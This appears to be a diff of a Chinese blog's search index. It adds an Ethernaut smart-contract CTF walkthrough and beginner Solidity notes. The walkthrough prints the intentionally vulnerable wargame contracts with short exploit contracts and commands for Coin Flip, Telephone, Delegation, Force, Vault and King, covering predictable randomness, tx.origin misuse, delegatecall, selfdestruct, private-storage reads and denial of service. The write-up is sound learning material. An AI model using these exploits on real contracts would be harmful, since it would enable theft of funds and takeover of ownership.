@@ -36,7 +36,111 @@
     <url>/2023/04/03/ethernaut/</url>
     <content><![CDATA[<p>打靶场的记录</p>
 <span id="more"></span>
-]]></content>
+<h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a><strong>Hello Ethernaut</strong></h1><p>连接小狐狸后按照提示做即可</p>
+<p><img src="/images/ethernaut/image-20230321104045420.png" alt="image-20230321104045420"></p>
+<p>然后提交示例（作者好有意思啊</p>
+<p><img src="/images/ethernaut/image-20230321104122333.png" alt="image-20230321104122333"></p>
+<p>过关后还能得到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a><strong>Fallback</strong></h1><p>合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标：</p>
+<ul>
+<li>成为owner</li>
+<li>清空合约账户</li>
+</ul>
+<p>可以看到在withdraw函数可以直接转走合约地址的余额，但是要首先成为owner；同时，有两个地方可以成为owner：</p>
+<ol>
+<li><p>contribute，但限定了每次传入的数据，要满足条件的话需要执行10^6次</p>
+</li>
+<li><p>receive，这是一个特殊的函数，当向合约发送数据时会被自动调用。而且条件只需要让传入的数据和数组里的值大于0即可。同时，官方文档是这么描述receive的：</p>
+<p><img src="/images/ethernaut/image-20230405230527117.png" alt="image-20230405230527117"></p>
+<p>那么我们需要执行的操作就是，先调用contribute使得contributions[msg.sender]&gt;0，然后再向合约发送wei，再调用withdraw转走合约余额。</p>
+<p>注意，我们向合约发送的单位是wei，而题中的单位为ether：</p>
+<p><img src="/images/ethernaut/image-20230405230900958.png" alt="image-20230405230900958"></p>
+<p>修改owner：</p>
+<p><img src="/images/ethernaut/image-20230405230830479.png" alt="image-20230405230830479"></p>
+</li>
+</ol>
+<p>可以看到owner已经被修改，然后即可通关。</p>
+<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求是成为owner。</p>
+<p>这关更简单了，直接调用Fal1out就行了。</p>
+<p>原来背景是有一家公司改了合约名但是没改构造函数的名字，损失++</p>
+<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a><strong>Coin Flip</strong></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标：猜对硬币10次</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip&#123;</span><br><span class="line">    function flip(bool _guess) external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    CoinFlip interact;</span><br><span class="line"></span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        interact = CoinFlip(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool _guess = coinFlip == 1 ? true : false;   </span><br><span class="line">        interact.flip(_guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>交互10次即可。</p>
+<p>背景指出在区块链上生成随机数是很难的，建议用<a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a>之类的</p>
+<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a><strong>Telephone</strong></h1><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标是要成为合约的owner，让tx.origin != msg.sender成立。</p>
+<p>二者的区别:</p>
+<ul>
+<li>tx.origin会遍历整个调用栈并返回最初发送调用（或交易）的帐户的地址。</li>
+<li>msg.sender为直接调用智能合约功能的帐户或智能合约的地址</li>
+</ul>
+<p>简单的说，只要写一个合约去调用changeOwner函数，那么msg.sender就会是合约地址，而tx.origin仍然是我的账户的地址，就可以满足判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    Telephone tele;</span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        tele = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function atta() public&#123;</span><br><span class="line">        tele.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>做完后题目还给了个攻击案例：</p>
+<p><img src="/images/ethernaut/image-20230406112041546.png" alt="image-20230406112041546"></p>
+<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a><strong>Token</strong></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下溢的洞，直接转账就行。</p>
+<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a><strong>Delegation</strong></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>考察的是delegationcall</p>
+<ul>
+<li><p>call: 调用后内置变量 msg 的值会修改为<strong>调用者</strong>，执行环境为被<strong>调用者的运行环境</strong></p>
+</li>
+<li><p>delegatecall: 调用后内置变量 msg 的值<strong>不会修改为调用者</strong>，但执行环境为<strong>调用者的运行环境</strong>（相当于复制被调用者的代码到调用者合约）</p>
+</li>
+<li><p>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p>
+<p>由于执行环境是调用者（Delegation）的环境，所以pwn()调用后，修改的是Delegation的owner=msg.sender，又因为不会改msg.sender，所以Delegation的owner变成了我们的账户地址。</p>
+</li>
+</ul>
+<p>参数可以本地算：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function func() public view returns (bytes4)&#123;</span><br><span class="line">        return bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#0xdd365b8b</span><br></pre></td></tr></table></figure>
+<p>也可以在js里算<code>web3.utils.keccak256(&quot;pwn()&quot;).slice(0, 10)</code>：</p>
+<p><img src="../images/ethernaut/image-20230406114824062.png" alt="image-20230406114824062"></p>
+<p>为什么是slice前十个：</p>
+<ol>
+<li>为什么要写web3.utils.keccak256()？这里面有两个问题，第一，写keccak()必须要加上前面的web3.utils，才能引入keccak()方法。第二，keccak()是一种被选定为SHA-3标准的单向散列函数算法，大概是一个海绵体结构，有吸入和挤出阶段。</li>
+<li>为什么用slice(0,10)？以下补充一些solidity的函数选择器知识。</li>
+</ol>
+<p><strong>函数选择器知识补充：</strong></p>
+<p>一个函数<strong>调用数据的前 4 字节</strong>，指定了要调用的函数。 这就是某个函数签名的 Keccak 哈希的前 4 字节（高位在左的大端序）。</p>
+<p>（但是传入的数据仍然需要前10个才能被正确解析）</p>
+<p><img src="/images/ethernaut/image-20230406115805637.png" alt="image-20230406115805637"></p>
+<p><img src="/images/ethernaut/image-20230406115819488.png" alt="image-20230406115819488"></p>
+<p>后记： <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a>介绍了一个攻击案例</p>
+<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
+<p>目标是强行向合约转账，考点为selfdestruct：</p>
+<p>selfdestruct函数是一个自毁函数，当调用它时，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    constructor()  payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address payable _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后记：</p>
+<p><img src="/images/ethernaut/image-20230406171745559.png" alt="image-20230406171745559"></p>
+<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标是把locked设为false，那么需要得到password</p>
+<p>尽管password设为private，但这只是限制外部合约访问这个变量，数据保存在区块链上是透明的，可以直接用getStorageAt函数获取:</p>
+<p><code>web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</code></p>
+<p><img src="/images/ethernaut/image-20230406174556548.png" alt="image-20230406174556548"></p>
+<p>把数据放进remix里就能直接解析出来<img src="/images/ethernaut/image-20230406174623483.png" alt="image-20230406174623483"></p>
+<p>后记：</p>
+<p><img src="/images/ethernaut/image-20230406175010825.png" alt="image-20230406175010825"></p>
+<h1 id="King"><a href="#King" class="headerlink" title="King"></a><strong>King</strong></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标是发送大于1000000000000000的wei成为king，而且不能让目标合约替代自己成为king</p>
+<p>考察的是transfer函数：</p>
+<p><img src="/images/ethernaut/image-20230406182805634.png" alt="image-20230406182805634"></p>
+<p>如果transfer执行失败会进行回退，而call和send函数则不是，而是返回一个false</p>
+<p>用 remix 部署合约，只需要构造一个没有 payable 的回退函数或者压根没有fallback函数，就接收不到金额了</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address _addr) public payable&#123;</span><br><span class="line">        _addr.call.gas(10000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ethernaut/image-20230406183005656.png" alt="image-20230406183005656"></p>
+<p>后记：</p>
+<p>Most of Ethernaut’s levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.</p>
+<p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a>.</p>
+<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a><strong>Re-entrancy</strong></h1>]]></content>
       <categories>
         <category>blockchain</category>
       </categories>
@@ -1271,6 +1375,312 @@ x_{i+1}=ax_i+c=-B_2x_i+c=...=C_{i+1}c\\
       </categories>
       <tags>
         <tag>RSA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>智能合约</title>
+    <url>/2023/05/08/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
+    <content><![CDATA[<p>之前做审计的时候都是碰到什么学什么，这样的代价就是基础很差， 要一直搜重复的东西，所以决定好好读一遍<a href="https://learnblockchain.cn/docs/solidity/">Solidity 中文文档 — Solidity中文文档 — 登链社区 (learnblockchain.cn)</a>，然后再搞别的，预期这个月以内</p>
+<span id="more"></span>
+<p>[toc]</p>
+<h1 id="Solidity源文件结构"><a href="#Solidity源文件结构" class="headerlink" title="Solidity源文件结构"></a>Solidity源文件结构</h1><p>源文件中可以包含任意数量的 合约定义 , 源文件引入 , pragma 、 using for 指令和 struct , enum , function , error 以及常量定义。</p>
+<h2 id="SPDX版本许可标识"><a href="#SPDX版本许可标识" class="headerlink" title="SPDX版本许可标识"></a>SPDX版本许可标识</h2><p>全称为“The Softwaere Package Data Exchange”，用来说明其版权许可证</p>
+<p><code>// SPDX-License-Identifier: MIT</code></p>
+<h2 id="版本标识"><a href="#版本标识" class="headerlink" title="版本标识"></a>版本标识</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pragma</span></span><br></pre></td></tr></table></figure>
+<p>Pragma 是 pragmatic information 的简称，启用编译检查功能，检查版本是否匹配，例如</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pragma</span> solidity ^<span class="number">0</span>.<span class="number">5</span>.<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+<p>表示可被大于等于0.5.2且小于0.6.0的版本编译。</p>
+<h2 id="导入其他源文件"><a href="#导入其他源文件" class="headerlink" title="导入其他源文件"></a>导入其他源文件</h2><p>solidity支持导入语句来模块化代码</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure>
+<p><code>filename</code>被称为导入路径</p>
+<p>但不建议使用这种形式，它会把导入路径中的全局符号都导入到当前全局作用域，会无法预测的污染当前命名空间，可以使用如下形式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import * as symbolName from “filename”;</span><br><span class="line">//两种方式等价</span><br><span class="line">import &quot;filename&quot; as symbolName;</span><br></pre></td></tr></table></figure>
+<p>如果存在命名冲突，可以在导入时重命名符号。下面代码就创建了新的全局符号<code>alias</code>和<code>symbol2</code>，引用的<code>symbol1</code>和<code>symbol2</code>来自”filename“。</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;symbol1 <span class="keyword">as</span> <span class="keyword">alias</span>, symbol2&#125; <span class="keyword">from</span> &quot;filename&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>可以使用单行注释（ <code>//</code> ）和多行注释（ <code>/*...*/</code> ）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这是一个单行注释</span><br><span class="line">/*</span><br><span class="line">这是一个</span><br><span class="line">多行注释。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>此外，还有一种注释叫做 NatSpec 注释，用三斜线（ <code>///</code> ）或双星号块（ <code>/** ... */</code> ）来写， 它们应该直接用在函数声明或语句的上方。</p>
+<h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><p>在 Solidity 中，合约类似于面向对象编程语言中的类。 每个合约中可以包含 状态变量， 函数， 函数修饰器， 事件， 错误， 结构类型 和 枚举类型 的声明，且合约可以从其他合约继承。</p>
+<p>还有一些特殊种类的合同，叫做 库合约 和 接口合约。</p>
+<h2 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h2><p>状态变量是指其值被永久地存储在合约存储中的变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData; // 状态变量</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><p>函数是代码的可执行单位。 通常在合约内定义函数，但它们也可以被定义在合约之外。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.7.1 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // 函数</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义在合约之外的辅助函数</span><br><span class="line">function helper(uint x) pure returns (uint) &#123;</span><br><span class="line">    return x * 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="函数修饰器（modifier）"><a href="#函数修饰器（modifier）" class="headerlink" title="函数修饰器（modifier）"></a>函数修饰器（modifier）</h2><p>函数修饰器可以被用来以声明的方式修改函数的语义</p>
+<p>具有同一个modifier的名字但参数不同是不可能的；但是modifier可以被重载/覆写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.22 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // 修饰器</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public view onlySeller &#123; // 修饰器的使用</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="事件（event）"><a href="#事件（event）" class="headerlink" title="事件（event）"></a>事件（event）</h2><p>事件是能方便地调用以太坊虚拟机日志功能的接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.21 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // 事件</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // 触发事件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
